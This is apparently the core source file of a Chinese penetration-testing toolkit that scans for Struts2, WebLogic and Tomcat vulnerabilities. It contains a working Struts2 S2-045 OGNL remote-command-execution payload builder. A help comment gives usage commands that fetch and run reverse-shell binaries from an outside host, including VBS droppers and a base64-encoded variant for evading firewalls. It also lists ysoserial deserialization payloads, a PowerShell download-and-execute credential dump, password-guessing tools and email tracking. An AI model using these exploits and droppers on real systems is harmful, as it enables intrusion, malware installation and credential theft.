// 数据拷贝
global.copyO2O=function (oS,oD)
{
	for(var k in oS)
	{
		oD[k] = oS[k];
	}
	return oD;
}
var g_url = require('url'),
	util=require('util'),
// 全局初始化的标志
	g_bInit = 0;
global.program = require('commander');
function fnGetRequest(req)
{
	var _req = req;
	if(program && program.proxy)
	{
		// process.env["HTTP_PROXY"] = "http://127.0.0.1:8880";
		console.log("当前代理：" + program.proxy);
		_req = req.defaults({'proxy': program.proxy})
	}
	return _req;
}	

// util.inherits(sub,require('events').EventEmitter);
// this.emit('something');
// 定义全局变量
copyO2O({szMyName:'M.T.X._2017-06-08 1.0',
	request:fnGetRequest(require('request')),
	g_oRstAll:{},// 结果差分比较
	_request:fnGetRequest(require('request')),
	urlObj:require('url'),
	g_szMyMsg:"我有我有一键修复、且零入侵(不修改一行代码)的方案，价格2000美金，你要吗？赶紧拿起你的电话，call me",
	g_szSplit:/[,;\s\|]/gmi,
	g_host2Ip:{},// 域名到ip转换缓存
	async:require('async'),
	g_nThread:5,// 并发线程数
	child_process:require("child_process"),
	net:require('net'),
	crypto:require('crypto'),
	path:require("path"),
	fs:require('fs'),
	g_szUrl:"",bReDo:false, szLstLocation:"",
	g_oRst:{},
	timeout:5000,
	g_nPool:100,
	iconv:require("iconv-lite"),
	bRunHost:false,
	g_szUa:"Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540",
	g_szCmd:"echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
	g_szCmdW:"echo whoami:&& whoami && echo pwd:&& echo %cd% && echo cmdend", // && dir
	aHS:"X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
	fnError:function(e)
	{
		console.log(String(e));
	},
	getIps:function(ip)
{
	var re = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/gmi.exec(ip);
	if(re && 0 < re.length)ip = re[1];
	request.get("http://ipinfo.io/" + ip,function(e,r,b)
	{
		try{if(!e)g_oRst["ipinfo"] = JSON.parse(b);}catch(e1){}
	});

},// 解析裸头信息
fnParseHttpHd:function(s,fnCbk)
{
	var a = String(s).trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[String(aT[0]).toLowerCase().trim()] = String(aT[1]).trim();
	}
	if(fnCbk)fnCbk(obj);
},// 智能差分获取结果
fnCfRst:function(url,s,oRst)
{
	var o = oRst && oRst[url] && oRst[url].body || g_oRstAll[url] && g_oRstAll[url].body,x = 0,y;

	if(!o)
	{
		// console.log("没有找到。。" + url);
		// console.log(oRst);
		return s;
	}
	var i = o.split(),j = s.split();
	y = j.length;
	for(var e = 0; e < i.length;e++)
	{
		if(e >= y)break;
		if(i[e] == j[e])x = e;
		else break;
	}
	
	var yy = 0;
	for(var e = i.length - 1; 0 < e;e--)
	{
		if(0 >= j.length - yy)break;
		if(i[e] == j[j.length - yy - 1])y = j.length - yy;
		else break;
	}
	// console.log("[[x = [" + x + "]][[y = [" + y + "]]" + j.length);
	if(1 < y -x)return s.substr(x,y);
	return s;
},
	parseUrl:function(url)
	{
		var oU = g_url.parse(url);
		if(!oU.port)
		{
			if("https" == oU.protocol)oU.port = 443;
			else if("http" == oU.protocol)oU.port = 80;
		}
		return oU;
	},
	// tomcat测试
// https://www.exploit-db.com/exploits/41783/
// /?{{%25}}cake\=1
// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
// 基于socket发送数据
fnSocket:function(h,p,szSend,fnCbk)
{
	var s, rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi;

	if(h && !(s = rIp.exec(h)))
	{
		if(g_host2Ip[h])h = g_host2Ip[h];
		else
		{
			s = child_process.execSync("host " + h);
			s = rIp.exec(s);
			if(s)g_host2Ip[h] = s[0],h = s[0];
		}
	}
	try{
		const client = net.connect(fnOptHeader({"port": p,"host":h}), () => 
		{
		  client.write(szSend);
		});
		client.on('data', (data) => 
		{
			fnCbk(data);
			client.end();
		});
		client.on('end', () =>{});
	}catch(e){}
},
fnLog:function(s)
{
	if(program.verbose && s)console.log(s.toString());
},
g_oAllPlugins:{},// 所有插件加载后的缓存
// 获取插件
fnGetPlugIn:function(s)
{
	var o,a = [];
	for(var k in g_oAllPlugins)
	{
		o = g_oAllPlugins[k];
		if(o.fnCheckTags(s))
		{
			a.push(o);
		}
	}
	return 0 < a.length ? a : null;
},
/* 
1、通过关键词找到可用插件
2、自动运行可用插件
*/
runChecks:function(url,szTags,fnCbk,parms)
{
	fnCbk||(fnCbk = fnReport);
	var fnT = function()
	{

		var nTm = setTimeout(function(){
			if(1 < g_bInit)
			{
				clearTimeout(nTm);
				fnLog("g_bInit = " + g_bInit);
				fnT();
				return;
			}
			var a = fnGetPlugIn(szTags);
			if(a)
			{
				for(var k in a)
				{
					var o = a[k];
					try{
						if(!g_oForm[o.url + o.tags])
							o.doCheck(url,function(o9,_t)
							{
								g_oForm[o9.url + _t.tags] = 1;
								// 便于差分比较结果
								// g_oRstAll[o9.url] = o9;
								fnCbk(o9,_t);
							},parms);
					}catch(e){fnLog(e)}
				}
			}
			clearTimeout(nTm);
		},133);
	};
	fnT();
},fnReport:function(o,_t)
{
	var o1 = fnGetPlugIn("report");
	if(o1)
	{
		for(var k in o1)
			o1[k].doCheck(o,_t);
	}
},
fnHelp:function(){
/*
tomcat Put test
Struts2_001
Struts2_005
Struts2_007
Struts2_008
Struts2_009
Struts2_012
Struts2_013
Struts2_015
Struts2_016
Struts2_019
Struts2_020
Struts2_029
Struts2_032
Struts2_033
Struts2_037
Struts2_DevMode
Struts2_045
Struts2_046
Struts2_048
Struts2_053
elasticsearch
伪造host等检测

node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045

# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
# cd myhktools/jars;python -m SimpleHTTPServer 8080
node checkUrl.js -u http://92.68.0.5:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

cd myhktools/jars;java -jar jfxl.jar xxx.x.xx.xx:xxx -i
pwd
put myhktools/bin/run.sh
/home/weblogic/Oracle/Middleware/user_projects/domains/domain/run.sh 

node checkUrl.js -u http://19.6.4.19:8122/login.jsp --struts2 045 --cmd 'x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &'

x=Lover1234_65.exe; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x};

cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/Powershell-Modules/master/Get-MSSQLCredentialPasswords.psm1"); Get-MSSQLCredentialPasswords

node checkUrl.js -u http://119.6.84.189:8122/login.jsp --struts2 045 --cmd 'echo "eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo="|base64 -D|sh'

绕过防火墙、执行命令，避免引号等在注入攻击时失效
思路：
对执行的命令串编码，base64，运行时解码再执行，例如：
echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -D|sh

x=linuxRvsTcp123.elf; wget --header='User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' http://23.105.209.65/linuxRvsTcp123.elf; chmod +x linuxRvsTcp123.elf; ./${x} &

# 生成远程反弹payload
java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  C3P0 '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  CommonsCollections1  '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8888/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'


node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'

# 批量开放T3检测，txt中可以放url
node checkUrl.js --t3 checkT3hostsUrlsFile.txt
# 常见webshell和url扫描
node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/

# 当别人能够访问你，但是不能访问10.115的时候，进行端口转发，
# 这样别人访问你的9000等同于访问10.115的8080，https的时候不使用，因为数字证书会检查域名
node portForward.js 9000 192.168.10.115 8080

# T3协议漏洞的检测和利用
java -jar jfxl.jar 192.168.19.30:7001

# 指定一个网段的漏洞验证扫描
java -jar jfxl.jar 192.168.19.30-255:7001

# 目录、文件中文本文件字符集批量转换为utf-8
# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
node gbk2utf8.js fileOrDirName

# 多种解码
node decode.js base64等格式字符串

# eml 文件批量读取、转换
node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data

# 手工XSS、渗透时需要的一些常用编码、解码
open strDecodeEncode.html

# 获取图片中的元数据（经纬度、创建时间）
node getFileMetadata.js yourJpgFile.jpg

# jndi内网无密码访问漏洞测试
java -jar ./JNDI_TEST/JNDITEST.jar -p 7101 -u 192.168.10.216 -j QIMS_TEST -d mysql

# weblogic中间件T3漏洞扫描
编辑ip.txt
python ./weblogic.py

# 二维码解码
node QrCodeDecode.js Haiios.jpg

# svn 弱密码检测 2017-01-22 M.T.X
node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd

# 信箱默认密码测试
node testPop3.js 12.171.20.20 110 mytels.txt

# http代理，有时候需要一个二级代理，来获得、修改一些数据
# 动态代理，每次自动随机使用代理
node proxy/ProxyServer.js
or
pm2 start ProxyServer.js -i max

# 更新代理 autoProxy.txt

node checkProxy.js
cat autoProxy.txt|sort|uniq >ok.txt
mv ok.txt autoProxy.txt
cat autoProxy.txt|wc -l

# 提取目录、文件，包含二进制文件中 ip信息
# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
node getIps.js fileOrDir

# 发送无跟踪邮件
sendmail.js  内容自行修改
邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
proxychains4 -f ~/pc.conf  node sendmail.js 

# 某种js压缩后的解码、压缩编码, win下运行
压缩.hta

# 连接http隧道
python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp

*/
},fnMyHelp:function(fn)
{
	var s = (fn||fnHelp).toString().split(/\n/).slice(2, -2).join('\n');
	if(fn)return s
	console.log(s);
},
fnOptHeader:function(o)
{
	var k = {followAllRedirects:true,followRedirect:true,"timeout":timeout,pool: {maxSockets: g_nPool}};
	for(var i  in k)
	{
		if(!o[i])
			o[i] = k[i];
	}
	return o;
},// 指定字符转换url编码
fnUrlEncode:function(s,cs)
{
	var rg = new RegExp("([" + cs.replace(/([\(\)\[\]\$\.\\\/\{\}\?\*])/gmi,"\\$1") + "])","gmi");
	return s.replace(rg,function(a,b)
	{
		return '%' + b.charCodeAt(0).toString(16);
	});
},
fnUrlEncode2:function(x1)
{
	return fnUrlEncode(x1,'#:@=.[]?( )%/+${}');
},
fnCheckVul1:function(body)
{
	body = String(body);
	var xx1 = body.split("whoami:");
	if(0 < xx1.length)
	{
		body = "whoami:" + xx1[1];
		xx1 = body.split("\ncmdend");
		if(0 < xx1.length)
		{
			body = xx1[0] + "\ncmdend\n";
		}
		// console.log(body);
	}
	return body.replace(/\r/gmi,'').replace(/\n+/gmi,"\n");
},
/*
获取表单数据，并推进表单字段测试
*/
g_oForm:{},// 防止重复执行
fnDoForm:function(s,url)
{
	if(s && url)
	{
		if(g_oForm[url])return;
		var re = /<input .*?name=['"]*([^'"]+)['"]*\s[^>]*>/gmi,oFFds = {},n = 0,
		    reFa = /action=['"]*([^ "']+)['"]*/gmi,aHref = /\s*(href|URL)=['"]*([^ "']+)['"]*/gmi;
		var a = reFa.exec(s),szUrl = url;
		// 获取当前页面中的action路径非常重要
		if(a &&  0 < a.length &&  a[1])
		{
			if('/' == a[1].substr(0,1))
				szUrl = szUrl.substr(0, szUrl.indexOf('/',12)) + a[1];
			else szUrl = szUrl + "/" + a[1];
		}
		// console.log(s);
		// 抽取form字段
		while(a = re.exec(s))
		{
			oFFds[a[1]]='';
			n++;
		}
		// console.log(oFFds);
		if(0 < n)runChecks(szUrl,"struts2,parms",null,oFFds);
		
		// 连接的遍历、获取、探测
		var aTmp = [];
		while(a = aHref.exec(s))
		{
			szUrl = url;
			a[1] = String(a[2]);
			var g_rStc = /\.(htm|js|png|jpg|jpeg|css|cab|exe|swf|jar|ico|doc|docx|pdf|xls)\b/gmi;
			if(1 >= a[1].length || /javascript|void/gmi.test(a[1]) || g_rStc.test(a[1]))continue;

			if('/' == a[1].substr(0,1))
				szUrl = szUrl.substr(0, szUrl.indexOf('/',12)) + a[1];
			else if(0 == a[1].indexOf("http"))
			{
				var nT1 = Math.min(a[1].length, url.length);
				// 同源才继续
				if(a[1].substr(0, nT1) == url.substr(0, nT1))
					aTmp.push(a[1]);
			}
			else szUrl = szUrl + "/" + a[1];
			aTmp.push(szUrl);
			// runChecks(s,"struts2",szUrl);
		}
		if(0 < aTmp.length)
		{
			console.log("爬取到以下链接：");
			console.log(aTmp);
		}
		async.mapLimit(aTmp,g_nThread,function(s,fnCbk1)
		{
			g_oForm[s] = 1;
			
			runChecks(s,"struts2",function(o,_t)
			{
				fnReport(o,_t);
			});
			fnCbk1();
		});
		// 表示这个页面的form分析过了
		g_oForm[url] = 1;
	}
},// 获取Ta3异常消息
fnGetErrMsg:function(body)
{
	if(body)
	{
		body = body.toString();
		fnCheckKeys(body);
		var s1 = "Base._dealdata(", i = body.indexOf(s1);
		if(-1 < i)body = body.substr(i + s1.length);
		s1 = "});";
		i = body.indexOf(s1);
		if(-1 < i)body = body.substr(0, i + 1);
		try
		{
			if(g_reServer)
			{
				var oS = g_reServer.exec(body);
				if(oS && 0 < oS.length && g_oRst.server)g_oRst.server += " " + oS[1],g_reServer = null;
			}
			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
			return o.errorDetail;
		}catch(e)
		{
			var bHv = false;
			i = body.indexOf("at com.");
			if(bHv = -1 < i)body = body.substr(i - 11);
			i = body.lastIndexOf("at ");
			if(-1 < i)bHv = true,body = body.substr(0,i);
			if(bHv)return body;
		}
	}
	return "";
},
// 缓存正则表达式，便于提高效率
g_reKeys:null,
fnCheckKeys:function(b)
{
	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
	g_oRst.checkKeys || (g_oRst.checkKeys = {});
	var oMp = {}, ss;
	if(!g_oRst.checkKeys.passwordInputs)
	{
		while(a = re.exec(b))
		{
			if(!r1.exec(a[0]))
			{
				ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
				if(!oMp[ss])
					oMp[ss] = 1,r.push(ss);
			}
		}
		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
	}
	oMp = {};
	s = program.keys || "./urls/keywords";
	if(!g_oRst.checkKeys.keys && fs.existsSync(s))
	{
		a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
		g_reKeys = a;
		re = [];
		while(s = a.exec(b))
		{
			if(!oMp[s[1]])
				oMp[s[1]]=1,re.push(s[1]);
		}
		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
	}
},
fnDoBody:function(body,t,url,rep,fnCbk)
{
	fnCbk ||(fnCbk=function(){});
	var oRst = {};
	// win 字符集处理
	if(body && -1 < String(body).indexOf("[^\/]administrator"))
	{
		 try{body = iconv.decode(body,"cp936").toString("utf8");}catch(e){}
		 // console.log(body);
	}
	if(body)body = body.toString();
	oRst.body = body;
	fnDoForm(body,url);
	if( -1 == String(body||"").indexOf("whoami:\n"))return fnCbk(oRst);

	var e = fnGetErrMsg(body);
	if(e)oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
	// console.log(t);
	var oCa = arguments.callee.caller.arguments;
	if(!rep)rep = oCa[1];
	// error msg
	if(oCa[0])fnLog(oCa[0]);
	var repT = oCa[1] || {};
	
	// safegene
	if(repT && repT.headers && repT.headers['safegene_msg'])
		fnLog(decodeURIComponent(repT.headers['safegene_msg']));

	if(repT && repT.headers && repT.headers["struts2"])
	{
		oRst[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
		oRst.vul = true;
	}

	body||(body = "");
	if(!body)
	{
		// myLog(arguments);
	}

	if(!body)return fnCbk(oRst);
	body = body.toString("utf8").trim();
	var rg1 = /(__VIEWSTATEGENERATOR)/gmi;
	if(rg1.test(body))return fnCbk(oRst);

	// console.log(body.indexOf("echo+whoami"));return;
	oRst.config || (oRst.config = {});
	if(!oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
	{
		oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
	}
	// at 
	if(!oRst.config["dev"])
	{
		var re = /Exception\s+at ([^\(]+)\(/gmi;
			re = re.exec(body);
		if(re && 0 < re.length)
		{
			oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
		}
	}
	if(!oRst.config["x-powered-by"] && rep && rep.headers)
	{
		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
		{
			oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
		}
	}
	if(!oRst.config["server"] && rep && rep.headers)
	{
		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
		{
			oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
		}
	}

	var nwhoami = 0;
	if(t && program.cmd && -1 == body.indexOf("<body"))console.log(t + "\n" + body);
	if(!body || -1 == (nwhoami = body.indexOf("whoami")))return fnCbk(oRst);;
	
	//if(-1 < t.indexOf("s2-001"))console.log(body)
	body = body.substr(nwhoami).replace(/\n+/gmi,'\n');
	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
	if(-1 < i)body = body.substr(0,i);
	// if("s2-045" == t)console.log(body)
	// if(-1 < t.indexOf("s2-053"))console.log(body);
	// 误报
	if(-1 < body.indexOf("<body") && -1 == body.indexOf("whoami:") && -1 == body.indexOf("pwd:"))
	{
		console.log(body);
		return fnCbk(oRst);
	}
	oRst.vul = true;
	fnLog("发现高危漏洞("+ (url || rep && rep.request && rep.request.uri &&rep.request.uri.href || "") +"):\n" + t);
	
	if(0 < i) body = body.substr(0, i).trim().replace(/\u0000/gmi,'');
	// console.log(body);
	var oT = oRst,s1 = String(body).replace(/\r/gmi,'').split(/\n/);
	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
	if(-1 < body.indexOf("root") && !oT["root"])
		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	if(s1[0] && 50 > s1[0].length && !oT["user"])
		oT["user"] = "当前中间件启动的用户：" + String(-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
	var szMdPath = String(3 < s1.length ? s1[3] : "").trim();
	if(1 < s1.length && !oT["CurDir"] && szMdPath)
		oT["CurDir"] = {des:"当前中间件目录","path":szMdPath};
	fnCbk(oRst);
},
fnMkPayload:function(w,l)
{
	w || (w = g_szCmdW);
	l || (l = g_szCmd);
	copyO2O({g_postData:"%{(#nike='multipart/form-data')"
		// s-045不允许下面的代码
		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedClasses']=true)"
		+ ".(#rplc=true)"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + w + "'}:{'/bin/bash','-c','" + l + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		// response.addHeader
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+ ".(#ros=(#response.getOutputStream()))"

	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}"},global);
}
},global);

// 加载所有的插件动态库
// 各种插件库分开编写，便于维护
// eval(fs.readFileSync(a[k])+'');
process.title = '巅狼团队_M.T.X.V 2.0'
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";
process.on('uncaughtException', fnError);
process.on('unhandledRejection', fnError);

// 多个关键词的搜索
function fnCheckTags(s)
{
	var o = this._t, r = true,a = s.split(g_szSplit);
	if(o)
	{
		for(var i = 0; i < a.length; i++)
		{
			if(r = r && !!o[a[i]])continue;
			else
			{
				r = false;
				break;
			};
		}
	}
	else r = false;
	return r;
}

// 初始化关键词
function fnInitTags(o)
{
	var a = o.tags.split(g_szSplit);
	o._t || (o._t = {});
	for(var i = 0; i < a.length; i++)
	{
		o._t[a[i]] = true;
	}
	o["fnCheckTags"] = fnCheckTags;
}

// 加载所有插件，并驱动执行
function doImportAllPlugIns(filename)
{
	fs.stat(filename,function(e,stats)
	{
		if(stats.isFile() && /\.(js)/gmi.test(filename) && fs.existsSync(filename))
		{
			try{
				if(-1 < filename.indexOf("core.js") || -1 < filename.indexOf("core_new.js"))return --g_bInit;
				var k = g_oAllPlugins[filename] = require(filename);
				fnInitTags(k);
				console.log("loaded " + filename);
			}catch(e1){console.log(e1);}
			g_bInit--;
		}
		else if(stats.isDirectory())
		{
			fs.readdir(filename,{},function(e,aF)
			{
				g_bInit += aF.length;
				aF.forEach(function(i)
				{
					g_bInit--;
					if(".DS_Store" == i)
					{
						fs.unlinkSync(filename + "/" + i);
					}
					else doImportAllPlugIns(filename + "/" + i);
				});
			});
		}
	});
}
doImportAllPlugIns(__dirname);

// request接口
var a = fnGetPlugIn("request");
if(a && 0 < a.length)
{
	request = function(o,fnCbk)
	{
		for(var k in a)
		{
			var o = a[k];
			try{
				o.doCheck(o,fnCbk);
			}catch(e){fnLog(e)}
		}
		_request(o,fnCbk);
	};
}

String.prototype.trim=function()
{
	return this.replace(/(^\s*)|(\s*$)/gmi,'');
};

Array.prototype.indexOf=function(s)
{
	for(var k in this)
	{
		if(s == this[k])return k;
	}
	return -1;
};

/*
+function(){
	for(var k in global)
	{
		var oT = global[k], t = typeof oT;
		if("object" !=  t && "function" != t)
		eval(k + " = " + JSON.stringify(oT));
	}
}();
console.log(szMyName);
*/
